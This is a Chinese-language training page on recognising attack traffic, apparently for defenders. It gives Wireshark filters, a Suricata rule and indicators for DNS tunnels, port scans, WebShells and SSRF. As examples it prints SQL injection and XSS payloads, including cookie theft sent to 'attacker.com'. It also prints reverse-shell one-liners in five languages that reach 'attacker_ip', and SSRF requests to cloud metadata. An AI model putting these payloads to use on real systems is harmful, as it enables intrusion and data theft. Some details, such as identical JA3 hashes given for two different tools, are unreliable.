流量特征原理

掌握常见网络协议的攻击流量特征，能够快速识别各类网络攻击行为

HTTP/HTTPS流量特征

原理 HTTP请求方法分布

正常业务流量的HTTP请求方法有明显的分布特征，GET请求通常占70%以上，POST次之。当发现异常的方法分布时，应警惕攻击行为。

正常分布

  • GET: 70-80%
  • POST: 15-25%
  • PUT/DELETE: <5%

异常分布

  • POST占比突然升高
  • 出现OPTIONS/HEAD等探测方法
  • TRACE方法（测试路由）

重点 User-Agent分析

User-Agent字段可以揭示客户端类型，攻击者常使用工具化的User-Agent或伪造知名浏览器的标识。

常见攻击工具UA
# SQL注入探测工具
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Sqlmap/1.6.8#stable

# 目录扫描工具
Mozilla/5.0 (compatible; DirBuster-0.12; +http://www.owasp.org/)
python-requests/2.28.0

# 漏洞利用工具
Metasploit Framework 6.3.0
wget/1.21.3

# 浏览器伪装（正常）
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
发现非浏览器UA或工具化UA时，需要重点关注后续攻击行为

URL路径模式分析

正常的URL路径符合业务逻辑，攻击流量往往包含特殊字符、编码或异常路径结构。

正常URL特征

  • /api/user/login
  • /products/list?page=1
  • /static/css/style.css

可疑URL特征

  • /admin/config.php.bak
  • /..%2F..%2Fetc/passwd
  • /?id=1 UNION SELECT

HTTP响应状态码分析

状态码 含义 关注点
200 正常响应 结合上下文判断是否为攻击成功
301/302 重定向 恶意重定向、钓鱼跳转
400 错误请求 探测类攻击常返回400
403 禁止访问 扫描敏感目录
500 服务器错误 可能存在注入成功导致应用报错

DNS协议流量特征

DNS查询类型分布

正常的DNS查询以A记录和AAAA记录为主，如果发现大量MX、NS、TXT、CNAME等记录查询，警惕DNS隧道或数据外传。

Wireshark筛选
# 筛选TXT记录查询（常用于DNS隧道）
dns.qry.type == 16

# 筛选MX记录查询
dns.qry.type == 15

# 筛选异常大的DNS响应（隧道可能携带更多数据）
dns.resp.len > 200

重点 DGA域名识别

域名生成算法（Domain Generation Algorithm）被恶意软件用于频繁更换C2域名，特征如下：

  • 域名长度随机，通常较长
  • 包含随机数字和字母组合
  • 常见恶意软件家族特征词
  • 同一IP解析大量不同域名
DGA域名示例
# Conficker蠕虫
mxgqjwfkhk.cn, nbeutqehxkh.ru, cyihndmqwhwc.cn

# Zeus GameOver
7h5g4hb7.com, 8j6k5l3a2.ru, 9k7m6n5b4.com

# Necurs
kpldtmkfqfhhhr.com, gqowyjmqmfgbgq.com

DNS隧道流量特征

DNS隧道通过DNS协议传输数据，绕过网络限制。特征包括：

  • 查询频率异常高（远超过正常业务需求）
  • 子域名长度异常（base32/base64编码数据藏在子域名中）
  • TXT记录请求大量出现
  • 相同域名的高频查询（心跳机制）
  • DNS响应中携带异常大量的数据

TCP/UDP流量特征

TCP连接状态分析

TCP连接状态异常往往预示着攻击行为。

异常连接状态

  • 大量SYN_SENT状态（端口扫描）
  • 大量FIN_WAIT_1（拒绝服务）
  • 短时间内的重复连接（暴力破解）
  • 异常端口的SYN连接

需要关注的标志位

  • PSH+ACK 数据传输
  • 异常RST连接断开
  • 无载荷的SYN包（探测）
  • 畸形TCP标志位组合

端口扫描识别

端口扫描是网络侦察的常见手段，流量特征明显：

端口扫描流量特征
# SYN扫描特征
- 大量发往不同端口的SYN包
- 目标端口响应SYN+ACK（开放）或RST（关闭）
- 源端口通常为高端口

# Connect扫描特征
- 完整的TCP三次握手
- 可能触发IDS/IPS告警

# UDP扫描特征
- ICMP Port Unreachable响应判断端口状态
- 扫描速度相对较慢

TTL值分析

TTL值可以初步判断攻击者的地理位置和操作系统类型：

Windows (TTL=128)

通过计算跳数可判断是否为内网横移

Linux (TTL=64)

Web服务器、攻击者主机

网络设备 (TTL=255)

路由器、交换机

SQL注入流量特征

SQL注入攻击特征

SQL注入通过在用户输入中插入恶意SQL语句，获取数据库敏感信息或执行非法操作。

常见注入特征

SQL注入payload示例
# 经典永真式
' OR '1'='1
' OR 1=1--
admin'--

# UNION注入
' UNION SELECT NULL--
' UNION SELECT username,password FROM users--

# 报错注入
' AND (SELECT CASE WHEN 1=1 THEN 1/0 ELSE 0 END)--
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--

# 布尔注入
' AND 1=1--
' AND 1=2--

# 时间盲注
' AND SLEEP(5)--
' AND IF(1=1,BENCHMARK(5000000,MD5('A')),0)--

HTTP流量中的识别点

  • URL参数或POST body中出现单引号、双引号、括号
  • 出现UNION、SELECT、FROM、WHERE等SQL关键字
  • 出现16进制编码或URL编码的特殊字符
  • Cookie中携带SQL语句片段
Wireshark筛选
# 筛选POST请求中的SQL注入特征
http.request.method == POST && (http contains "'" || http contains "UNION" || http contains "SELECT")

# 筛选可能的注入尝试
http.request.uri contains "id=" && (http.request.uri contains "'" || http.request.uri contains "UNION")

# 筛选错误信息泄露
http contains "sql" && http contains "error"

XSS攻击流量特征

跨站脚本攻击特征

XSS通过在网页中注入恶意脚本代码，窃取用户会话或执行恶意操作。

XSS Payload类型

XSS payload示例
<!-- 反射型XSS -->
<script>alert(document.cookie)</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert(document.domain)>

<!-- 存储型XSS -->
<script>fetch('http://attacker.com?c='+document.cookie)</script>

<!-- DOM型XSS -->
<script>location.href='http://attacker.com?c='+document.cookie</script>

<!-- 编码绕过 -->
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>

识别要点

  • 请求中包含script、img、svg等HTML标签
  • 出现onerror、onload、onclick等事件处理器
  • JavaScript函数调用：alert、eval、fetch、XMLHttpRequest
  • 十六进制或Unicode编码的字符
Wireshark筛选
# 筛选script标签
http contains "<script"
http contains "script>"

# 筛选事件处理器
http contains "onerror="
http contains "onload="

# 筛选JavaScript函数
http contains "alert("
http contains "eval("
http contains "fetch("

通用方法 WebShell检测分析思路

流量侧检测

  • 1. 关注异常大的HTTP POST请求
  • 2. 固定间隔的心跳请求
  • 3. 非标准端口的HTTP流量
  • 4. 异常的User-Agent
  • 5. 加密流量中的固定特征

行为侧检测

  • 1. 短时间内请求同一IP多次
  • 2. 命令执行类操作(如whoami)
  • 3. 文件遍历/读取敏感文件
  • 4. 数据库批量查询
  • 5. 横向移动探测

响应侧检测

  • 1. 命令回显包含系统信息
  • 2. 文件列表响应
  • 3. 数据库连接响应
  • 4. 异常长的HTTP响应
  • 5. 可疑的编码内容

综合分析Wireshark筛选

综合检测筛选
# 1. 筛选疑似WebShell的流量（POST请求 + 非标准端口 + 较大长度）
http.request.method == POST && !(tcp.port == 80 || tcp.port == 443) && frame.len > 500

# 2. 筛选常见WebShell参数
(http contains "z0=" || http contains "z1=" || http contains "pass=") && http.request.method == POST

# 3. 筛选已知工具的特征
http contains "acw_sc__v2" || http contains "BSESSIONID" || http contains "WHOAMI_PROMPT"

# 4. 筛选加密通信中的明文特征
http contains "@eval" || http contains "@system(" || http contains "base64_decode"

# 5. 筛选短时间内的重复请求（心跳检测）
ip.addr == suspicious_ip && http && frame.time_delta < 5

反弹Shell流量特征

反弹Shell原理与特征

反弹Shell是攻击者获取目标主机权限后的常见操作，通过主动连接外部C2服务器，将shell权限反弹给攻击者。

常见反弹Shell方式

反弹Shell命令示例
# Bash反弹
bash -i >& /dev/tcp/attacker_ip/port 0>&1

# Python反弹
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker_ip",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'

# PHP反弹
php -r '$sock=fsockopen("attacker_ip",port);exec("/bin/bash -i <&3 >&3 2>&3");'

# Perl反弹
perl -e 'use Socket;$i="attacker_ip";$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Ruby反弹
ruby -rsocket -e 'f=TCPSocket.open("attacker_ip",port).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

流量识别特征

  • 外网IP主动连接（正常业务通常不主动连接外部）
  • 连接频率异常（心跳保活）
  • 端口非80/443但使用HTTP协议
  • 传输数据包含命令执行结果
  • 同一外部IP被多个内部主机连接
Wireshark筛选
# 筛选主动外连的非HTTP(S)流量
ip.src == internal_ip && !(tcp.port == 80 || tcp.port == 443) && ip.dst != private_ranges

# 筛选可能的shell特征
tcp contains "bash"
tcp contains "/bin/sh"
tcp contains "python"

# 筛选长时间保持的异常连接
tcp && tcp.analysis.out_of_order_frames && tcp.payload.len > 0

隧道流量特征

网络隧道流量分析

隧道技术用于在受限网络环境中建立隐蔽通信通道，常见于数据外传和C2通信。

DNS隧道

  • 查询频率异常高
  • 子域名编码数据
  • TXT记录滥用

ICMP隧道

  • ICMP载荷异常大
  • 非常规ICMP类型
  • 数据隐藏在学习中

HTTP隧道

  • 非标准端口HTTP
  • 请求头异常
  • 分块传输编码滥用

SSH隧道

  • 本地端口转发
  • 动态 socks代理
  • 密钥认证流量

检测要点

  • 隧道流量通常具有高持续性、低带宽特征
  • 协议层面看起来正常，但通信模式异常
  • 需要结合威胁情报和基线分析
  • 关注非工作时间的大量外出流量

SSRF服务端请求伪造

SSRF攻击原理与特征

攻击原理

SSRF(Server-Side Request Forgery)利用服务器发起请求，攻击内网资源、绕过防火墙、扫描内网端口等。

常见攻击场景

  • 云服务元数据获取(aws/ec2/aliyun)
  • 扫描内网端口和服务
  • 读取本地文件
  • 攻击内部数据库
  • Redis/DB未授权访问

请求示例 (Wireshark视图)

SSRF典型请求
# 云服务元数据探测
GET /url?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
GET /url?url=http://100.100.100.200/latest/meta-data/ HTTP/1.1

# 内网端口扫描
GET /url?url=http://192.168.1.1:22 HTTP/1.1

JA3 TLS指纹分析与检测

JA3/JA3S指纹原理

JA3是对TLS客户端Hello的指纹计算，可识别客户端应用。即使用户-Agent伪造，JA3仍然会暴露真实客户端。

  • JA3: 客户端Hello指纹(识别浏览器/工具)
  • JA3S: 服务器Hello指纹(识别服务类型)
  • 恶意软件有固定JA3指纹
  • 可在威胁情报平台查询已知恶意指纹
常见JA3指纹
# Chrome浏览器
7732424a97e896723fb30ebcd77e1d4e

# Cobalt Strike (默认)
af7559582eb1f70f33cf3cfc15b5eb59

# Metasploit Meterpreter
af7559582eb1f70f33cf3cfc15b5eb59

JA3检测方法

Wireshark原生不直接支持JA3筛选，需要通过以下方式：

  • 1. 使用Suricata规则 JA3.hash
  • 2. 使用Zeek提取JA3后关联分析
  • 3. 使用Wireshark Lua插件
  • 4. 导出PCAP到本地用Python py JA3库分析
Suricata规则示例
# 检测已知恶意JA3
alert tls any any -> any any (msg:"Cobalt Strike JA3"; \
  ja3.hash == "af7559582eb1f70f33cf3cfc15b5eb59"; \
  classtype:trojan-activity; sid:1000001;)

SSH SSH隧道与加密隧道检测

SSH隧道类型

  • 本地端口转发(-L): 将本地端口转发到远程
  • 远程端口转发(-R): 将远程端口转发到本地
  • 动态SOCKS代理(-D): 建立SOCKS代理
  • 用于绕过防火墙、隐蔽通信

SSH隧道检测特征

  • TCP 22端口的长时间连接
  • 大量端口转发产生的流量模式
  • 非标准端口但使用SSH协议
  • 长时间持续的心跳流量
tcp.port == 22 && tcp.analysis.duration > 3600
tcp.port == 22 && frame.len < 100 && frame.time_delta > 60
